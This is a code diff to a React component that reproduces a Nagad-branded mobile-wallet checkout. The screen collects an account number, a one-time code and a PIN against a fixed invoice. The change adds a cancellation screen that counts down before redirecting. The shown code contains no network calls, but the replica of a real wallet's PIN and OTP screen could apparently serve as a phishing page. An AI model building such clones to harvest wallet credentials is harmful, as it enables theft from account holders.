@@ -8,6 +8,8 @@ const NagadPayment = () => {
   const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
+  const [showCancelView, setShowCancelView] = useState(false);
+  const [cancelTimer, setCancelTimer] = useState(5);
   const [otpValue, setOtpValue] = useState("");
   const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
   const [language, setLanguage] = useState<'bn' | 'en'>('en');
@@ -24,9 +26,20 @@ const NagadPayment = () => {
     setTimeout(() => {
       if (showPinView) pinInputRefs.current[0]?.focus();
       else if (showOtpView) otpInputRef.current?.focus();
-      else phoneInputRefs.current[0]?.focus();
+      else if (!showCancelView) phoneInputRefs.current[0]?.focus();
     }, 100);
-  }, [showOtpView, showPinView]);
+  }, [showOtpView, showPinView, showCancelView]);
+
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (showCancelView && cancelTimer > 0) {
+      interval = setInterval(() => setCancelTimer((p) => p - 1), 1000);
+    }
+    if (showCancelView && cancelTimer === 0) {
+      navigate("/payment-cancelled?channel=GenZ Direct Debit&reason=Method not Selected&amount=434.00");
+    }
+    return () => clearInterval(interval);
+  }, [showCancelView, cancelTimer, navigate]);
 
   const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
   const getPhoneNumber = () => phoneDigits.join("");
@@ -74,7 +87,10 @@ const NagadPayment = () => {
     setOtpValue("");
     setOtpResent(true);
   };
-  const handleClose = () => navigate("/payment-cancelled?channel=GenZ Direct Debit&reason=Method not Selected&amount=434.00");
+  const handleClose = () => {
+    setShowCancelView(true);
+    setCancelTimer(5);
+  };
 
   // Translations
   const t = {
@@ -149,90 +165,116 @@ const NagadPayment = () => {
 
         {/* Content area */}
         <div className="flex-1 flex flex-col justify-evenly min-h-0">
-          {/* Cart Icon & Title */}
-          <div className="flex flex-col items-center shrink-0">
-            <img src={cartIcon} alt="Cart" className="w-16 h-16 mb-2 object-contain" />
-            <h1 className="text-[#ccc] text-lg font-bold">{t.title}</h1>
-          </div>
-
-          {/* Invoice Details */}
-          <div className="px-8 shrink-0">
-            <div className="space-y-1.5">
-              <div className="flex">
-                <span className="text-[#ccc] font-bold text-sm w-32">{t.invoiceNo}</span>
-                <span className="text-[#ccc] font-bold text-sm">B255527202718B</span>
-              </div>
-              <div className="flex">
-                <span className="text-[#ccc] font-bold text-sm w-32">{t.totalAmount}</span>
-                <span className="text-[#ccc] font-bold text-sm">BDT 434</span>
-              </div>
-              <div className="flex">
-                <span className="text-[#ccc] font-bold text-sm w-32">{t.charge}</span>
-                <span className="text-[#ccc] font-bold text-sm">BDT 0</span>
-              </div>
-            </div>
-          </div>
-
-          {/* Input Section */}
-          <div className="flex flex-col items-center px-5 shrink-0">
-            {showPinView ? (
-              <div className="flex flex-col items-center">
-                <p className="text-[#ccc] text-center text-base font-bold mb-4">{t.enterPin}</p>
-                {renderPinInputs()}
-                <p className={`text-yellow-300 text-sm font-bold mt-3 text-center ${pinError ? 'visible' : 'invisible'}`}>
-                  {pinError || "placeholder"}
+          {showCancelView ? (
+            <>
+              {/* Cancel View */}
+              <div className="flex flex-col items-center justify-center flex-1">
+                <div className="w-12 h-12 rounded-full border-2 border-white/60 flex items-center justify-center mb-4">
+                  <span className="text-white text-2xl font-bold">✕</span>
+                </div>
+                <h2 className="text-[#ccc] text-base font-bold mb-2">
+                  {language === 'bn' ? 'পেমেন্ট বাতিল হয়েছে' : 'Payment Cancelled'}
+                </h2>
+                <p className="text-[#ccc] text-xs font-bold">
+                  {language === 'bn' ? 'মার্চেন্ট ওয়েবসাইটে রিডাইরেক্ট হচ্ছে' : 'Redirecting to'}{' '}
+                  <span className="underline">{language === 'bn' ? 'মার্চেন্ট ওয়েবসাইট' : 'Merchant Website'}</span>
+                  {' '}{language === 'bn' ? `${cancelTimer} সেকেন্ডে` : `in ${cancelTimer}s`}
                 </p>
               </div>
-            ) : showOtpView ? (
-              <div className="flex flex-col items-center w-full">
-                <p className="text-[#ccc] text-center text-base font-bold mb-4">{t.enterOtp}</p>
-                <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
-                  onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                  placeholder="XXXXXX"
-                  className="w-4/5 h-10 bg-white rounded text-center text-gray-800 text-sm font-medium focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
-                />
-                {otpResent && (
-                  <p className="text-[#ccc] text-[11px] font-bold mt-3 whitespace-nowrap">{t.otpResent}</p>
+
+              {/* Nagad Logo */}
+              <div className="flex justify-center shrink-0 mb-4">
+                <img src={nagadLogoWhite} alt="Nagad" className="h-12 object-contain" />
+              </div>
+            </>
+          ) : (
+            <>
+              {/* Cart Icon & Title */}
+              <div className="flex flex-col items-center shrink-0">
+                <img src={cartIcon} alt="Cart" className="w-16 h-16 mb-2 object-contain" />
+                <h1 className="text-[#ccc] text-lg font-bold">{t.title}</h1>
+              </div>
+
+              {/* Invoice Details */}
+              <div className="px-8 shrink-0">
+                <div className="space-y-1.5">
+                  <div className="flex">
+                    <span className="text-[#ccc] font-bold text-sm w-32">{t.invoiceNo}</span>
+                    <span className="text-[#ccc] font-bold text-sm">B255527202718B</span>
+                  </div>
+                  <div className="flex">
+                    <span className="text-[#ccc] font-bold text-sm w-32">{t.totalAmount}</span>
+                    <span className="text-[#ccc] font-bold text-sm">BDT 434</span>
+                  </div>
+                  <div className="flex">
+                    <span className="text-[#ccc] font-bold text-sm w-32">{t.charge}</span>
+                    <span className="text-[#ccc] font-bold text-sm">BDT 0</span>
+                  </div>
+                </div>
+              </div>
+
+              {/* Input Section */}
+              <div className="flex flex-col items-center px-5 shrink-0">
+                {showPinView ? (
+                  <div className="flex flex-col items-center">
+                    <p className="text-[#ccc] text-center text-base font-bold mb-4">{t.enterPin}</p>
+                    {renderPinInputs()}
+                    <p className={`text-yellow-300 text-sm font-bold mt-3 text-center ${pinError ? 'visible' : 'invisible'}`}>
+                      {pinError || "placeholder"}
+                    </p>
+                  </div>
+                ) : showOtpView ? (
+                  <div className="flex flex-col items-center w-full">
+                    <p className="text-[#ccc] text-center text-base font-bold mb-4">{t.enterOtp}</p>
+                    <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
+                      onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                      placeholder="XXXXXX"
+                      className="w-4/5 h-10 bg-white rounded text-center text-gray-800 text-sm font-medium focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
+                    />
+                    {otpResent && (
+                      <p className="text-[#ccc] text-[11px] font-bold mt-3 whitespace-nowrap">{t.otpResent}</p>
+                    )}
+                  </div>
+                ) : (
+                  <div className="flex flex-col items-center">
+                    <p className="text-[#ccc] text-center text-base font-bold mb-4">{t.accountNumber}</p>
+                    {renderPhoneInputs()}
+                    {phoneError && (
+                      <p className="text-yellow-300 text-sm font-medium mt-3">{phoneError}</p>
+                    )}
+                  </div>
+                )}
+
+                {!showOtpView && !showPinView && (
+                  <p className="text-[#ccc] text-center text-xs leading-tight font-bold mt-5 px-2">
+                    {t.termsText}
+                    <span className="text-[#ccc] font-bold underline">{t.termsLink}</span>
+                  </p>
                 )}
               </div>
-            ) : (
-              <div className="flex flex-col items-center">
-                <p className="text-[#ccc] text-center text-base font-bold mb-4">{t.accountNumber}</p>
-                {renderPhoneInputs()}
-                {phoneError && (
-                  <p className="text-yellow-300 text-sm font-medium mt-3">{phoneError}</p>
+
+              {/* Buttons */}
+              <div className="flex gap-8 justify-center shrink-0">
+                <button
+                  onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
+                  className="px-6 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                >{t.proceed}</button>
+                {showOtpView && (
+                  <button onClick={handleResendOtp}
+                    className="px-4 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                  >{t.resendCode}</button>
                 )}
+                <button onClick={handleClose}
+                  className="px-6 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                >{t.close}</button>
               </div>
-            )}
 
-            {!showOtpView && !showPinView && (
-              <p className="text-[#ccc] text-center text-xs leading-tight font-bold mt-5 px-2">
-                {t.termsText}
-                <span className="text-[#ccc] font-bold underline">{t.termsLink}</span>
-              </p>
-            )}
-          </div>
-
-          {/* Buttons - between input and logo */}
-          <div className="flex gap-8 justify-center shrink-0">
-            <button
-              onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
-              className="px-6 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
-            >{t.proceed}</button>
-            {showOtpView && (
-              <button onClick={handleResendOtp}
-                className="px-4 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
-              >{t.resendCode}</button>
-            )}
-            <button onClick={handleClose}
-              className="px-6 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
-            >{t.close}</button>
-          </div>
-
-          {/* Nagad Logo */}
-          <div className="flex justify-center shrink-0">
-            <img src={nagadLogoWhite} alt="Nagad" className="h-12 object-contain" />
-          </div>
+              {/* Nagad Logo */}
+              <div className="flex justify-center shrink-0">
+                <img src={nagadLogoWhite} alt="Nagad" className="h-12 object-contain" />
+              </div>
+            </>
+          )}
         </div>
       </div>
     </div>
